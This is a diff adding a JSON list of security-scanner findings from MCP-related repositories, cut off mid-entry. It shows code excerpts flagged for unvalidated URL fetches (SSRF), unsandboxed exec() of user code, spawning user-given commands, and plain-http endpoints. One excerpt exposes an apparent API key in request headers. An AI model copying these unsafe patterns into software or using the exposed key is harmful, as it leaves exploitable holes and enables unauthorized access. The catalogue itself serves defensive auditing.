@@ -1,0 +1,728 @@
+[
+ {
+  "categoria": "input-validation",
+  "repo": "AIGNE-io/aigne-framework",
+  "file": "packages/core/src/prompt/skills/afs/exec.ts",
+  "line": 56,
+  "verdetto_pipeline": "VP",
+  "provenance": "rirun",
+  "evidence": "...(await this.afs.exec(input.path, JSON.parse(input.args), { context: options.context })),",
+  "tool_name": null,
+  "sorgente": {
+   "righe_totali": 59,
+   "estratto": "   44|           ),\n   45|       }),\n   46|       outputSchema: z.object({\n   47|         data: z.record(z.any()),\n   48|       }),\n   49|     });\n   50|   }\n   51| \n   52|   async process(input: AFSExecInput, options: AgentInvokeOptions): Promise<AFSExecOutput> {\n   53|     if (!this.afs) throw new Error(\"AFS is not configured for this agent.\");\n   54| \n   55|     return {\n   56|       ...(await this.afs.exec(input.path, JSON.parse(input.args), { context: options.context })),\n   57|     };\n   58|   }\n   59| }"
+  },
+  "branch": "main",
+  "n": 1
+ },
+ {
+  "categoria": "input-validation",
+  "repo": "Alleyway-boop/Swagger-MCP",
+  "file": "src/services/getSwaggerDefinition.ts",
+  "line": 22,
+  "verdetto_pipeline": "VP",
+  "provenance": "rirun",
+  "evidence": "const response = await axios.get(params.url);",
+  "tool_name": null,
+  "sorgente": {
+   "righe_totali": 59,
+   "estratto": "   10|  * @param params Parameters including URL and save location\n   11|  * @returns The saved Swagger definition information\n   12|  */\n   13| export const getSwaggerDefinition = async (params: GetSwaggerParams) => {\n   14|   try {\n   15|     logger.info('Fetching Swagger definition from ' + params.url);\n   16|     if (!params.url) {\n   17|       throw new Error('URL is required');\n   18|     }\n   19|     if (!params.saveLocation) {\n   20|       throw new Error('Save location is required');\n   21|     }\n   22|     const response = await axios.get(params.url);\n   23| \n   24|     // If the response is not a valid Swagger definition, throw an error\n   25|     if (!response.data.openapi && !response.data.swagger) {\n   26|       logger.error('Invalid Swagger definition');\n   27|       throw new Error('Invalid Swagger definition');\n   28|     }\n   29| \n   30|     // If the response is a valid Swagger definition, save it as a hashed filename of the URL\n   31|     const url = new URL(params.url);\n   32|     const filename = crypto.createHash('sha256').update(url.toString()).digest('hex') + '.json';\n   33|     \n   34|     // Use the provided save location"
+  },
+  "http": 404,
+  "branch": "master",
+  "n": 2
+ },
+ {
+  "categoria": "input-validation",
+  "repo": "Amlan66/SSEEnabledMCPAgent",
+  "file": "mcp_server_1.py",
+  "line": 189,
+  "verdetto_pipeline": "VP",
+  "provenance": "rirun",
+  "evidence": "exec(input.code, allowed_globals, local_vars)",
+  "tool_name": null,
+  "sorgente": {
+   "righe_totali": 274,
+   "estratto": "  177|     allowed_globals = {\n  178|         \"__builtins__\": __builtins__  # Allow imports like in executor.py\n  179|     }\n  180| \n  181|     local_vars = {}\n  182| \n  183|     # Capture print output\n  184|     stdout_backup = sys.stdout\n  185|     output_buffer = io.StringIO()\n  186|     sys.stdout = output_buffer\n  187| \n  188|     try:\n  189|         exec(input.code, allowed_globals, local_vars)\n  190|         sys.stdout = stdout_backup\n  191|         result = local_vars.get(\"result\", output_buffer.getvalue().strip() or \"Executed.\")\n  192|         return PythonCodeOutput(result=str(result))\n  193|     except Exception as e:\n  194|         sys.stdout = stdout_backup\n  195|         return PythonCodeOutput(result=f\"ERROR: {e}\")\n  196| \n  197| \n  198| \n  199| \n  200| \n  201| "
+  },
+  "http": 404,
+  "branch": "master",
+  "n": 3
+ },
+ {
+  "categoria": "input-validation",
+  "repo": "Code-Fundi/dispersl-mcp",
+  "file": "src/server.ts",
+  "line": 2844,
+  "verdetto_pipeline": "VP",
+  "provenance": "rirun",
+  "evidence": "const response = await fetch(input.url);",
+  "tool_name": null,
+  "sorgente": {
+   "righe_totali": 2944,
+   "estratto": " 2832|     return result;\n 2833|   }\n 2834| }\n 2835| \n 2836| // Content Helper Functions\n 2837| export const imageContent = async (\n 2838|   input: { buffer: Buffer } | { path: string } | { url: string }\n 2839| ): Promise<ImageContent> => {\n 2840|   let rawData: Buffer;\n 2841| \n 2842|   try {\n 2843|     if (\"url\" in input) {\n 2844|       const response = await fetch(input.url);\n 2845|       if (!response.ok) {\n 2846|         throw new Error(`Server responded with status: ${response.status}`);\n 2847|       }\n 2848|       rawData = Buffer.from(await response.arrayBuffer());\n 2849|     } else if (\"path\" in input) {\n 2850|       rawData = await readFile(input.path);\n 2851|     } else if (\"buffer\" in input) {\n 2852|       rawData = input.buffer;\n 2853|     } else {\n 2854|       throw new Error(\"Invalid input: Provide a valid 'url', 'path', or 'buffer'\");\n 2855|     }\n 2856| "
+  },
+  "branch": "main",
+  "n": 4
+ },
+ {
+  "categoria": "input-validation",
+  "repo": "Community-Tech-UK/mcp-wordpress-elementor",
+  "file": "src/tools/media.ts",
+  "line": 72,
+  "verdetto_pipeline": "VP",
+  "provenance": "rirun",
+  "evidence": "const fileResponse = await axios.get(params.source_url, { responseType: 'arraybuffer' });",
+  "tool_name": null,
+  "sorgente": {
+   "righe_totali": 115,
+   "estratto": "   60|   list_media: async (params) => {\n   61|     try {\n   62|       const response = await makeWordPressRequest('GET', 'media', params);\n   63|       return { toolResult: { content: [{ type: 'text', text: JSON.stringify(response, null, 2) }] } };\n   64|     } catch (error: any) {\n   65|       const msg = error.response?.data?.message || error.message;\n   66|       return { toolResult: { isError: true, content: [{ type: 'text', text: `Error listing media: ${msg}` }] } };\n   67|     }\n   68|   },\n   69|   create_media: async (params) => {\n   70|     try {\n   71|       // Download the file from source_url\n   72|       const fileResponse = await axios.get(params.source_url, { responseType: 'arraybuffer' });\n   73|       const fileBuffer = Buffer.from(fileResponse.data);\n   74| \n   75|       // Create form data\n   76|       const FormData = (await import('form-data')).default;\n   77|       const formData = new FormData();\n   78|       const filename = params.title.toLowerCase().replace(/\\s+/g, '-') +\n   79|         (path.extname(params.source_url.split('?')[0]) || '.jpg');\n   80|       formData.append('file', fileBuffer, { filename });\n   81|       if (params.title) formData.append('title', params.title);\n   82|       if (params.alt_text) formData.append('alt_text', params.alt_text);\n   83|       if (params.caption) formData.append('caption', params.caption);\n   84|       if (params.description) formData.append('description', params.description);"
+  },
+  "branch": "main",
+  "n": 5
+ },
+ {
+  "categoria": "input-validation",
+  "repo": "Deepractice/PromptX",
+  "file": "packages/resource/resources/tool/pdf-reader/pdf-reader.tool.js",
+  "line": 211,
+  "verdetto_pipeline": "VP",
+  "provenance": "rirun",
+  "evidence": "return path.join(...args.parts);",
+  "tool_name": null,
+  "sorgente": {
+   "righe_totali": 549,
+   "estratto": "  199|           hash.update(args.data);\n  200|           return hash.digest('hex');\n  201|         },\n  202|         mock: async (args, api) => {\n  203|           api.logger.debug('[Mock] Generating mock hash');\n  204|           return 'mock-hash-' + Date.now();\n  205|         }\n  206|       },\n  207| \n  208|       'path:join': {\n  209|         real: async (args, api) => {\n  210|           const path = await api.importx('path');\n  211|           return path.join(...args.parts);\n  212|         },\n  213|         mock: async (args, api) => {\n  214|           return args.parts.join('/');\n  215|         }\n  216|       }\n  217|     };\n  218|   },\n  219| \n  220|   getBridgeErrors() {\n  221|     return {\n  222|       'pdf:parse': [\n  223|         {"
+  },
+  "branch": "main",
+  "n": 6
+ },
+ {
+  "categoria": "input-validation",
+  "repo": "Emasoft/claude-plugins-validation",
+  "file": "scripts/_skillaudit_typescript_context.py",
+  "line": 1120,
+  "verdetto_pipeline": "VP",
+  "provenance": "rirun",
+  "evidence": "matched by the same pattern when they appear standalone (``fetch(req.X)``",
+  "tool_name": null,
+  "sorgente": {
+   "righe_totali": 2219,
+   "estratto": " 1108|     lo = max(0, line_idx - 2)\n 1109|     hi = min(len(lines), line_idx + 3)\n 1110|     window = \"\\n\".join(lines[lo:hi])\n 1111|     return bool(_TEST_UNICODE_VOCAB_RE.search(window))\n 1112| \n 1113| \n 1114| def _line_is_function_definition(source_line: str) -> bool:\n 1115|     \"\"\"True iff ``source_line`` looks like a JS/TS function/method definition\n 1116|     or a method INVOCATION on a local object (not an outbound HTTP call).\n 1117| \n 1118|     SSRF_ADVANCED pattern fires on ``async handleRequest(request) {`` and\n 1119|     ``server.handleRequest(request)`` because the catalog pattern matches\n 1120|     any ``request(`` occurrence. Those are not network calls — the actual\n 1121|     network functions (``fetch``, ``axios``, ``http.get``) are still\n 1122|     matched by the same pattern when they appear standalone (``fetch(req.X)``\n 1123|     has no preceding `.` so the method-invocation rule does NOT fire).\n 1124|     \"\"\"\n 1125|     stripped = source_line.lstrip()\n 1126|     # A concise-body arrow that inlines a GLOBAL outbound HTTP call\n 1127|     # (``const h = (req) => fetch(req.query.url)``) is a real SSRF surface,\n 1128|     # NOT a benign definition — the dangerous call shares the signature line.\n 1129|     # This veto MUST run FIRST, before the method-call-on-object check below:\n 1130|     # if a benign local method call also appears on the same line (e.g.\n 1131|     # ``(req) => logger.info(req.url) || fetch(req.query.target)``), the\n 1132|     # method-call loop would otherwise return True and suppress SSRF_ADVANCED,"
+  },
+  "http": 404,
+  "branch": "master",
+  "n": 7
+ },
+ {
+  "categoria": "input-validation",
+  "repo": "ForestAdmin/agent-nodejs",
+  "file": "packages/workflow-executor/src/oauth/refresh-grant.ts",
+  "line": 97,
+  "verdetto_pipeline": "VP",
+  "provenance": "rirun",
+  "evidence": "response = await fetch(params.tokenEndpoint, {",
+  "tool_name": null,
+  "sorgente": {
+   "righe_totali": 151,
+   "estratto": "   85|   // validation could still carry one — re-check before the outbound POST. Throws (terminal) rather\n   86|   // than reaching the network.\n   87|   assertSafeTokenEndpoint(params.tokenEndpoint);\n   88| \n   89|   const { headers, body } = buildRequest(params);\n   90| \n   91|   let response: Awaited<ReturnType<typeof fetch>>;\n   92| \n   93|   try {\n   94|     // Never follow redirects: a 3xx to an internal host would re-send the grant body (refresh\n   95|     // token, plus the client secret in client_secret_post) there and parse its reply as a token —\n   96|     // bypassing the endpoint validation above. Any redirect is treated as a failure.\n   97|     response = await fetch(params.tokenEndpoint, {\n   98|       method: 'POST',\n   99|       headers,\n  100|       body,\n  101|       redirect: 'manual',\n  102|     });\n  103|   } catch (cause) {\n  104|     throw new OAuthRefreshError('the token endpoint could not be reached', cause);\n  105|   }\n  106| \n  107|   if (response.type === 'opaqueredirect' || (response.status >= 300 && response.status < 400)) {\n  108|     throw new OAuthRefreshError('the token endpoint attempted a redirect');\n  109|   }"
+  },
+  "branch": "main",
+  "n": 8
+ },
+ {
+  "categoria": "input-validation",
+  "repo": "InhiblabCore/mcp-image-compression",
+  "file": "src/common.ts",
+  "line": 94,
+  "verdetto_pipeline": "VP",
+  "provenance": "rirun",
+  "evidence": "const response = await fetch(input.url);",
+  "tool_name": null,
+  "sorgente": {
+   "righe_totali": 122,
+   "estratto": "   82|   return false;\n   83| }\n   84| \n   85| /**\n   86|  * Generates an image content object from a URL, file path, or buffer.\n   87|  */\n   88| export const imageContent = async (\n   89|   input: { url: string } | { path: string } | { buffer: Buffer },\n   90| ): Promise<ImageContent> => {\n   91|   let rawData: Buffer;\n   92| \n   93|   if (\"url\" in input) {\n   94|     const response = await fetch(input.url);\n   95| \n   96|     if (!response.ok) {\n   97|       throw new Error(`Failed to fetch image from URL: ${response.statusText}`);\n   98|     }\n   99| \n  100|     rawData = Buffer.from(await response.arrayBuffer());\n  101|   } else if (\"path\" in input) {\n  102|     rawData = await readFile(input.path);\n  103|   } else if (\"buffer\" in input) {\n  104|     rawData = input.buffer;\n  105|   } else {\n  106|     throw new Error("
+  },
+  "branch": "main",
+  "n": 9
+ },
+ {
+  "categoria": "input-validation",
+  "repo": "InsForge/InsForge",
+  "file": "backend/src/services/storage/s3-signature.ts",
+  "line": 164,
+  "verdetto_pipeline": "VP",
+  "provenance": "rirun",
+  "evidence": "const m = AUTH_RE.exec(input.authorization);",
+  "tool_name": null,
+  "sorgente": {
+   "righe_totali": 532,
+   "estratto": "  152| export type VerifyResult =\n  153|   | {\n  154|       ok: true;\n  155|       accessKeyId: string;\n  156|       signingKey: Buffer;\n  157|       datetime: string;\n  158|       scope: string;\n  159|       seedSignature: string;\n  160|     }\n  161|   | { ok: false; code: VerifyFailureCode; reason: string };\n  162| \n  163| export function verifyHeaderSignature(input: VerifyInput): VerifyResult {\n  164|   const m = AUTH_RE.exec(input.authorization);\n  165|   if (!m) {\n  166|     return {\n  167|       ok: false,\n  168|       code: 'AuthorizationHeaderMalformed',\n  169|       reason: 'Authorization header not parseable',\n  170|     };\n  171|   }\n  172|   const [, accessKeyId, date, region, service, signedHeadersStr, clientSig] = m;\n  173|   if (service !== 's3') {\n  174|     return {\n  175|       ok: false,\n  176|       code: 'AuthorizationHeaderMalformed',"
+  },
+  "branch": "main",
+  "n": 10
+ },
+ {
+  "categoria": "input-validation",
+  "repo": "JacobHellmark/fastmcp",
+  "file": "src/FastMCP.ts",
+  "line": 74,
+  "verdetto_pipeline": "VP",
+  "provenance": "rirun",
+  "evidence": "const response = await fetch(input.url);",
+  "tool_name": null,
+  "sorgente": {
+   "righe_totali": 3096,
+   "estratto": "   62|   ready: () => void;\n   63|   rootsChanged: (event: { roots: Root[] }) => void;\n   64| };\n   65| \n   66| export const imageContent = async (\n   67|   input: { buffer: Buffer } | { path: string } | { url: string },\n   68| ): Promise<ImageContent> => {\n   69|   let rawData: Buffer;\n   70| \n   71|   try {\n   72|     if (\"url\" in input) {\n   73|       try {\n   74|         const response = await fetch(input.url);\n   75| \n   76|         if (!response.ok) {\n   77|           throw new Error(\n   78|             `Server responded with status: ${response.status} - ${response.statusText}`,\n   79|           );\n   80|         }\n   81| \n   82|         rawData = Buffer.from(await response.arrayBuffer());\n   83|       } catch (error) {\n   84|         throw new Error(\n   85|           `Failed to fetch image from URL (${input.url}): ${\n   86|             error instanceof Error ? error.message : String(error)"
+  },
+  "branch": "main",
+  "n": 11
+ },
+ {
+  "categoria": "input-validation",
+  "repo": "JoaoPedroLanca/mcp-web-tools",
+  "file": "src/server.js",
+  "line": 103,
+  "verdetto_pipeline": "VP",
+  "provenance": "rirun",
+  "evidence": "const res = await fetch(input.url, {",
+  "tool_name": null,
+  "sorgente": {
+   "righe_totali": 161,
+   "estratto": "   91|         };\n   92|     }\n   93| );\n   94| \n   95| server.tool(\n   96|     \"fetch_url\",\n   97|     {\n   98|         url: z.string().url(),\n   99|         maxBytes: z.number().int().min(1024).max(16 * 1024 * 1024).optional(),\n  100|     },\n  101|     async (input) => {\n  102|         const maxBytes = Math.min(input.maxBytes ?? MAX_FETCH_BYTES, 16 * 1024 * 1024);\n  103|         const res = await fetch(input.url, {\n  104|             headers: {\n  105|                 \"User-Agent\": \"Mozilla/5.0 (compatible; MCP-Web-Tools/0.1; +https://example.com)\",\n  106|                 Accept: \"*/*\",\n  107|             },\n  108|         });\n  109|         const contentType = res.headers.get(\"content-type\") || \"\";\n  110| \n  111|         const reader = res.body.getReader();\n  112|         let received = 0;\n  113|         const chunks = [];\n  114|         while (true) {\n  115|             const { done, value } = await reader.read();"
+  },
+  "branch": "main",
+  "n": 12
+ },
+ {
+  "categoria": "input-validation",
+  "repo": "Lspace-io/lspace-server",
+  "file": "src/orchestrator/orchestratorService.ts",
+  "line": 699,
+  "verdetto_pipeline": "VP",
+  "provenance": "rirun",
+  "evidence": "const response = await axios.get(input.url, { timeout: 10000 });",
+  "tool_name": null,
+  "sorgente": {
+   "righe_totali": 982,
+   "estratto": "  687|           const snippetTitle = input.title ? input.title.replace(/[^a-zA-Z0-9_.-]/g, '') : 'snippet';\n  688|           const snippetFileName = `${uuidv4()}-${snippetTitle}.txt`;\n  689|           relativeRawFilePathForRepoWrite = path.join('.lspace', 'raw_inputs', snippetFileName);\n  690|           rawFileOriginalName = input.title || snippetFileName; // Store original name\n  691|           await repository.writeFile(relativeRawFilePathForRepoWrite, input.content);\n  692|           rawFilePath = relativeRawFilePathForRepoWrite;\n  693|           contentForLLM = input.content; // Store content for LLM\n  694|           processingMessage = `Text snippet saved to ${rawFilePath}`;\n  695|           break;\n  696| \n  697|         case 'web_url':\n  698|           try {\n  699|             const response = await axios.get(input.url, { timeout: 10000 });\n  700|             let fetchedContent = response.data;\n  701|             if (typeof fetchedContent === 'object') {\n  702|               fetchedContent = JSON.stringify(fetchedContent, null, 2);\n  703|             }\n  704|             contentForLLM = String(fetchedContent); // Store content for LLM\n  705|             const safeHostname = new URL(input.url).hostname.replace(/[^a-zA-Z0-9_.-]/g, '');\n  706|             const urlFileName = `${uuidv4()}-url-${safeHostname}.txt`;\n  707|             relativeRawFilePathForRepoWrite = path.join('.lspace', 'raw_inputs', urlFileName);\n  708|             rawFileOriginalName = input.url; // Store original URL as name\n  709|             await repository.writeFile(relativeRawFilePathForRepoWrite, contentForLLM);\n  710|             rawFilePath = relativeRawFilePathForRepoWrite;\n  711|             processingMessage = `Content from ${input.url} fetched and saved to ${rawFilePath}`;"
+  },
+  "branch": "main",
+  "n": 13
+ },
+ {
+  "categoria": "input-validation",
+  "repo": "Mnehmos/mnehmos.index-foundry.mcp",
+  "file": "src/tools/connect.ts",
+  "line": 90,
+  "verdetto_pipeline": "VP",
+  "provenance": "rirun",
+  "evidence": "response = await fetch(input.url, {",
+  "tool_name": null,
+  "sorgente": {
+   "righe_totali": 587,
+   "estratto": "   78|     \n   79|     // Fetch the URL\n   80|     const controller = new AbortController();\n   81|     const timeout = setTimeout(() => controller.abort(), input.timeout_ms);\n   82|     \n   83|     const headers: Record<string, string> = {\n   84|       \"User-Agent\": config.defaults.connect.user_agent,\n   85|       ...input.headers,\n   86|     };\n   87|     \n   88|     let response: Response;\n   89|     try {\n   90|       response = await fetch(input.url, {\n   91|         headers,\n   92|         signal: controller.signal,\n   93|       });\n   94|     } finally {\n   95|       clearTimeout(timeout);\n   96|     }\n   97|     \n   98|     if (!response.ok) {\n   99|       return createToolError(\"FETCH_FAILED\", `HTTP ${response.status}: ${response.statusText}`, {\n  100|         details: { url: input.url, status: response.status },\n  101|         recoverable: response.status >= 500,\n  102|         suggestion: response.status >= 500 ? \"Retry later\" : \"Check URL validity\","
+  },
+  "http": 404,
+  "branch": "master",
+  "n": 14
+ },
+ {
+  "categoria": "input-validation",
+  "repo": "Oortonaut/mcacp",
+  "file": "src/acp/agent-requests.ts",
+  "line": 107,
+  "verdetto_pipeline": "VP",
+  "provenance": "rirun",
+  "evidence": "const child = spawn(params.command, params.args ?? [], {",
+  "tool_name": null,
+  "sorgente": {
+   "righe_totali": 191,
+   "estratto": "   95|     writeFileSync(path, params.content);\n   96|     return {};\n   97|   }\n   98| \n   99|   private createTerminal(params: TerminalCreateParams): TerminalCreateResult {\n  100|     const id = `term_${this.nextTerminalId++}`;\n  101|     const cwd = params.cwd ?? this.sessionCwds.get(params.sessionId);\n  102|     const env = { ...process.env };\n  103|     if (params.env) {\n  104|       for (const { name, value } of params.env) env[name] = value;\n  105|     }\n  106| \n  107|     const child = spawn(params.command, params.args ?? [], {\n  108|       cwd, env, shell: false, stdio: ['pipe', 'pipe', 'pipe'],\n  109|     });\n  110| \n  111|     const terminal: ManagedTerminal = {\n  112|       process: child, output: '', truncated: false,\n  113|       outputByteLimit: params.outputByteLimit ?? 1_048_576, waiters: [],\n  114|     };\n  115| \n  116|     const appendOutput = (chunk: Buffer) => {\n  117|       if (terminal.truncated) return;\n  118|       const text = chunk.toString();\n  119|       if (terminal.output.length + text.length > terminal.outputByteLimit) {"
+  },
+  "http": 404,
+  "branch": "master",
+  "n": 15
+ },
+ {
+  "categoria": "protocol-violation",
+  "repo": "BACH-AI-Tools/typescript-sse-mcp-client",
+  "file": "src/streamable-http-demo.ts",
+  "line": 17,
+  "verdetto_pipeline": "VP",
+  "provenance": "rirun",
+  "evidence": "url: \"http://fda.sitmcp.kaleido.guru/mcp\",",
+  "tool_name": null,
+  "sorgente": {
+   "righe_totali": 471,
+   "estratto": "    5|  */\n    6| \n    7| import { Client } from \"@modelcontextprotocol/sdk/client/index.js\";\n    8| import { StreamableHTTPClientTransport } from \"@modelcontextprotocol/sdk/client/streamableHttp.js\";\n    9| \n   10| /**\n   11|  * 连接 FDA StreamableHTTP MCP 服务器\n   12|  */\n   13| async function connectFdaStreamableHttp(): Promise<void> {\n   14|   // FDA StreamableHTTP MCP 服务器配置\n   15|   // 来自用户提供的配置\n   16|   const serverConfig = {\n   17|     url: \"http://fda.sitmcp.kaleido.guru/mcp\",\n   18|     headers: {\n   19|       \"emcp-key\": \"OoNkO7VC0LI0kJHjviZAwHbLaKg1LYhc\",\n   20|       \"emcp-usercode\": \"kBGM7xIY\",\n   21|     },\n   22|     type: \"streamableHttp\",\n   23|   };\n   24| \n   25|   const serverUrl = serverConfig.url;\n   26|   const headers = serverConfig.headers;\n   27| \n   28|   console.log(\"🌐 StreamableHTTP MCP 客户端示例\");\n   29|   console.log(\"=\".repeat(60));"
+  },
+  "branch": "main",
+  "n": 1
+ },
+ {
+  "categoria": "protocol-violation",
+  "repo": "DawnReaverWOWS/TheFinalDiscordMCP",
+  "file": "src/index.ts",
+  "line": 3153,
+  "verdetto_pipeline": "VP",
+  "provenance": "rirun",
+  "evidence": "'http://129.153.70.66',        // VM1 public IP",
+  "tool_name": null,
+  "sorgente": {
+   "righe_totali": 5584,
+   "estratto": " 3141|     \n 3142|     if (useHttp) {\n 3143|       // Start HTTP server\n 3144|       const port = parseInt(useHttp) || 3000;\n 3145|       \n 3146|       // Map to store active transports by session ID\n 3147|       const activeTransports = new Map();\n 3148|       \n 3149|       // CORS configuration for VM1 (frontend) access\n 3150|       const allowedOrigins = [\n 3151|         'http://10.0.0.174:3000',     // VM1 private IP (Next.js)\n 3152|         'http://10.0.0.174',           // VM1 private IP\n 3153|         'http://129.153.70.66',        // VM1 public IP\n 3154|         'http://129.153.70.66:3000',   // VM1 public IP with port\n 3155|         'http://localhost:3000',       // Local development\n 3156|         'http://127.0.0.1:3000',       // Local development\n 3157|       ];\n 3158| \n 3159|       // Add any custom origins from environment\n 3160|       const customOrigins = process.env.CORS_ORIGINS?.split(',') || [];\n 3161|       allowedOrigins.push(...customOrigins);\n 3162| \n 3163|       const httpServer = createServer(async (req, res) => {\n 3164|         const url = new URL(req.url || '/', `http://${req.headers.host}`);\n 3165|         const origin = req.headers.origin || '';"
+  },
+  "branch": "main",
+  "n": 2
+ },
+ {
+  "categoria": "protocol-violation",
+  "repo": "Econyx-ai/0g-mcp-server",
+  "file": "src/config/storage.ts",
+  "line": 26,
+  "verdetto_pipeline": "VP",
+  "provenance": "rirun",
+  "evidence": "kvUrl: \"http://3.101.147.150:6789\",",
+  "tool_name": null,
+  "sorgente": {
+   "righe_totali": 109,
+   "estratto": "   14|  * - OG_EVM_RPC: EVM RPC endpoint\n   15|  * - OG_INDEXER_RPC: Indexer RPC endpoint\n   16|  * - OG_KV_URL: KV client URL\n   17|  * - OG_FLOW_CONTRACT: Flow contract address\n   18|  * - OG_NETWORK: Network selection (testnet|mainnet)\n   19|  */\n   20| \n   21| // Network-specific configurations\n   22| const NETWORKS = {\n   23|   testnet: {\n   24|     evmRpc: \"https://evmrpc-testnet.0g.ai\",\n   25|     indexerRpc: \"https://indexer-storage-testnet-turbo.0g.ai\",\n   26|     kvUrl: \"http://3.101.147.150:6789\",\n   27|     flowContract: \"0xb8F03061969da6Ad38f0a4a9f8a86bE71dA3c8E7\",\n   28|   },\n   29|   mainnet: {\n   30|     evmRpc: \"https://evmrpc.0g.ai\",\n   31|     indexerRpc: \"https://indexer-storage-mainnet.0g.ai\",\n   32|     kvUrl: \"http://mainnet-kv.0g.ai:6789\", // Update with actual mainnet URL\n   33|     flowContract: \"0x0000000000000000000000000000000000000000\", // Update with actual mainnet contract\n   34|   },\n   35| } as const;\n   36| \n   37| type NetworkName = keyof typeof NETWORKS;\n   38| "
+  },
+  "http": 404,
+  "branch": "master",
+  "n": 3
+ },
+ {
+  "categoria": "protocol-violation",
+  "repo": "Embassy-of-the-Free-Mind/sourcelibrary-v2",
+  "file": "src/app/api/iiif/[id]/manifest/route.ts",
+  "line": 34,
+  "verdetto_pipeline": "VP",
+  "provenance": "rirun",
+  "evidence": "inc: 'http://rightsstatements.org/vocab/InC/1.0/',",
+  "tool_name": null,
+  "sorgente": {
+   "righe_totali": 636,
+   "estratto": "   22|   publicdomain: 'http://creativecommons.org/publicdomain/mark/1.0/',\n   23|   pdm: 'http://creativecommons.org/publicdomain/mark/1.0/',\n   24|   'public-domain': 'http://creativecommons.org/publicdomain/mark/1.0/',\n   25|   'cc0-1.0': 'http://creativecommons.org/publicdomain/zero/1.0/',\n   26|   cc0: 'http://creativecommons.org/publicdomain/zero/1.0/',\n   27|   'cc-by-4.0': 'http://creativecommons.org/licenses/by/4.0/',\n   28|   'cc-by-sa-4.0': 'http://creativecommons.org/licenses/by-sa/4.0/',\n   29|   'cc-by-nd-4.0': 'http://creativecommons.org/licenses/by-nd/4.0/',\n   30|   'cc-by-nc-4.0': 'http://creativecommons.org/licenses/by-nc/4.0/',\n   31|   'cc-by-nc-sa-4.0': 'http://creativecommons.org/licenses/by-nc-sa/4.0/',\n   32|   'cc-by-nc-nd-4.0': 'http://creativecommons.org/licenses/by-nc-nd/4.0/',\n   33|   'in-copyright': 'http://rightsstatements.org/vocab/InC/1.0/',\n   34|   inc: 'http://rightsstatements.org/vocab/InC/1.0/',\n   35|   'noc-us': 'http://rightsstatements.org/vocab/NoC-US/1.0/',\n   36|   'noc-nc': 'http://rightsstatements.org/vocab/NoC-NC/1.0/',\n   37|   cne: 'http://rightsstatements.org/vocab/CNE/1.0/',\n   38|   und: 'http://rightsstatements.org/vocab/UND/1.0/',\n   39| };\n   40| \n   41| /**\n   42|  * Resolve a stored license/rights value to a single IIIF `rights` URI.\n   43|  * Passes through values that are already CC / rightsstatements.org URIs, and\n   44|  * otherwise maps SPDX-ish IDs case-insensitively. The IIIF spec REQUIRES rights\n   45|  * to be exactly one CC or rightsstatements.org URI — anything else is dropped\n   46|  * rather than emitted as an invalid value."
+  },
+  "branch": "main",
+  "n": 4
+ },
+ {
+  "categoria": "protocol-violation",
+  "repo": "ForestAdmin/agent-nodejs",
+  "file": "packages/mcp-server/src/in-process-http-requester.ts",
+  "line": 15,
+  "verdetto_pipeline": "VP",
+  "provenance": "rirun",
+  "evidence": "super(bearerToken, { url: 'http://in-process.agent' });",
+  "tool_name": null,
+  "sorgente": {
+   "righe_totali": 61,
+   "estratto": "    3| import { HttpRequester } from '@forestadmin/agent-client';\n    4| \n    5| /**\n    6|  * HttpRequester that reaches the agent in-process (via the dispatcher) instead of over the network,\n    7|  * reusing HttpRequester's parse helpers so results and error shape stay identical to the HTTP path.\n    8|  */\n    9| export default class InProcessHttpRequester extends HttpRequester {\n   10|   constructor(\n   11|     private readonly bearerToken: string,\n   12|     private readonly dispatcher: InProcessAgentDispatcher,\n   13|   ) {\n   14|     // Sentinel host that never reaches the network: query() dispatches in-process, stream() throws.\n   15|     super(bearerToken, { url: 'http://in-process.agent' });\n   16|   }\n   17| \n   18|   // CSV export is not supported in-process; throw rather than fire a doomed request at the sentinel.\n   19|   override async stream(): Promise<void> {\n   20|     throw new Error('CSV streaming is not supported over the in-process MCP transport');\n   21|   }\n   22| \n   23|   override async query<Data = unknown>({\n   24|     method,\n   25|     path,\n   26|     body,\n   27|     query,"
+  },
+  "branch": "main",
+  "n": 5
+ },
+ {
+  "categoria": "protocol-violation",
+  "repo": "Jeeva0506/Playwright_MCP_Automation_Framework",
+  "file": "allure-report/app.js",
+  "line": 6686,
+  "verdetto_pipeline": "VP",
+  "provenance": "rirun",
+  "evidence": "urlRoot: 'http://marionettejs.com/docs/v' + r + '/',",
+  "tool_name": null,
+  "sorgente": {
+   "righe_totali": 41108,
+   "estratto": " 6674|               ((t._areViewEventsMonitored = !0),\n 6675|               t.on({\n 6676|                 'before:attach': k,\n 6677|                 attach: A,\n 6678|                 'before:detach': S,\n 6679|                 detach: O,\n 6680|                 'before:render': E,\n 6681|                 render: C,\n 6682|               }));\n 6683|           }\n 6684|           var P = ['description', 'fileName', 'lineNumber', 'name', 'message', 'number'],\n 6685|             j = i.call(Error, {\n 6686|               urlRoot: 'http://marionettejs.com/docs/v' + r + '/',\n 6687|               constructor: function (t, n) {\n 6688|                 e.isObject(t) ? (t = (n = t).message) : n || (n = {});\n 6689|                 var r = Error.call(this, t);\n 6690|                 (e.extend(this, e.pick(r, P), e.pick(n, P)),\n 6691|                   this.captureStackTrace(),\n 6692|                   n.url && (this.url = this.urlRoot + n.url));\n 6693|               },\n 6694|               captureStackTrace: function () {\n 6695|                 Error.captureStackTrace && Error.captureStackTrace(this, j);\n 6696|               },\n 6697|               toString: function () {\n 6698|                 return this.name + ': ' + this.message + (this.url ? ' See: ' + this.url : '');"
+  },
+  "branch": "main",
+  "n": 6
+ },
+ {
+  "categoria": "protocol-violation",
+  "repo": "Knuckles-Team/archivebox-api",
+  "file": "archivebox_api/ontology/__init__.py",
+  "line": 4,
+  "verdetto_pipeline": "VP",
+  "provenance": "rirun",
+  "evidence": "``http://knuckles.team/kg/archivebox`` module) which the agent-utilities hub federates in via",
+  "tool_name": null,
+  "sorgente": {
+   "righe_totali": 7,
+   "estratto": "    1| \"\"\"Archivebox ontology contribution (CONCEPT:AU-KG.ontology.federation-provider-leg).\n    2| \n    3| Data-only subpackage: it carries ``archivebox.ttl`` (the ``owl:Ontology``\n    4| ``http://knuckles.team/kg/archivebox`` module) which the agent-utilities hub federates in via\n    5| the ``agent_utilities.ontology_providers`` entry-point. It holds no business logic\n    6| and no heavy imports so the hub can resolve it cheaply.\n    7| \"\"\""
+  },
+  "branch": "main",
+  "n": 7
+ },
+ {
+  "categoria": "protocol-violation",
+  "repo": "Knuckles-Team/container-manager-mcp",
+  "file": "container_manager_mcp/ontology/__init__.py",
+  "line": 4,
+  "verdetto_pipeline": "VP",
+  "provenance": "rirun",
+  "evidence": "``http://knuckles.team/kg/container`` module) which the agent-utilities hub federates in via",
